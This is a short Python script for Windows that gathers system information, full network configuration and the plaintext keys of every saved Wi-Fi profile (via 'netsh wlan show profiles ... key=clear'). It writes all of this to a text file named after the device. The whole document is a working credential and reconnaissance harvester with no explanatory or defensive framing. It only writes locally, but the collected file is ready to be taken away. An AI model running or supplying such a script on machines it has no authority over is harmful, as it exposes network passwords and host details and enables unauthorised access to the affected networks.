import subprocess

print('Program running')

sysinfo = subprocess.check_output(['systeminfo']).decode('utf-8', errors="backslashreplace")
sysinfo2 = subprocess.check_output(['systeminfo']).decode('utf-8', errors="backslashreplace").split()

network = subprocess.check_output(['ipconfig','/all']).decode('utf-8', errors="backslashreplace")

device_name = sysinfo2[sysinfo2.index('Name:') + 1]
f=open(str(device_name)+".txt","x+")

#print(sysinfo)
f.write(sysinfo)
#print(network)
f.write(network)
    
dump = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles',]).decode('utf-8').split('\n')
#print(dump)
ssid = [i.split(":")[1][1:-1] for i in dump if "All User Profile" in i]
#print (ssid)

f.write('Network Credential \n\n')

for i in ssid:
    results = subprocess.check_output(['netsh','wlan','show', 'profiles', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    #print(i)
    f.write(str(i))
    #print(results)
    f.write(str(results))
    f.write('\n\n')

print('Done!!!')
f.close()
